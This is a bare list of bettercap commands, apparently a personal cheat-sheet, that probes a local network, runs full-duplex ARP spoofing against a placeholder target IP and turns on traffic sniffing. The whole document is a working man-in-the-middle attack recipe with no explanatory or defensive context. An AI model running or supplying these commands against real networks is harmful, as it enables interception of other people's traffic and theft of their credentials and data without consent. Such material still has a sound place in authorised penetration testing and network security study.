bettercap -iface eth0
net.probe on
net.recon on
net.show
set arp.spoof.fullduplex true
set arp.spoof.targets <IP TARGET>
arp.spoof on
set net.sniff.local true
net.sniff on